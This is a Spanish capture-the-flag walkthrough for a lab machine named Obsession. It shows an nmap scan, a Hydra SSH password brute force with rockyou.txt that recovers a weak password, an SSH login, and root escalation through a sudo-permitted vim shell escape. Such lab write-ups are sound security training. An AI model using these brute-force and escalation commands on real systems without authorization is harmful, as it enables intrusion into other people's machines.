# Explotación de la máquina Obsession

## Información general
- **Nombre de la máquina**: Obsession
- **Dirección IP**: 172.17.0.2
- **Puntos de entrada**: FTP (Puerto 21), SSH (Puerto 22), HTTP (Puerto 80)

## Reconocimiento
Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 13:22 -05
Initiating ARP Ping Scan at 13:22
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:22, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:22
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:22, 0.76s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-12-06 13:22:30 -05 for 1s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Los puertos 21, 22 y 80 estan abierto asi que procedemos a revisar el codigo fuente de la web.
Encontramos que tiene una linea de comentarios la cual nos indica lo siguiente 

```bash
<! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```
Con la informacion que la misma web nos indica y con un poco de logica el usuario deberia de ser ```russoski```

Asi que procedo a hacer un ataque de fuerza bruta con hydra

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-06 13:28:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-06 13:28:49```

Rapidamente nos encuentra un password en este caso ```iloveme```

Procedemos a conectarnos mediante el servicio ssh:

```bash
sudo ssh russoski@172.17.0.2                                          
russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@b47b308f2dfe:~$ whoami
russoski
```

Y wala! estamos conectados como russoski. 
El siguiente paso seria intentar escalar privilegios como root para esto usamos el comando ``` sudo -l ```


```bash
sudo -l
Matching Defaults entries for russoski on b47b308f2dfe:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on b47b308f2dfe:
    (root) NOPASSWD: /usr/bin/vim

```
Nos indica que hay permisos incorrectos y a la vez nos muestra que podriamos escalar privilegios con vim como no recuerdo como usamos searchbins: 

```bash
sudo vim -c ':!/bin/bash'

root@b47b308f2dfe:/home/russoski# whoami
root

```
Ya somos root!!
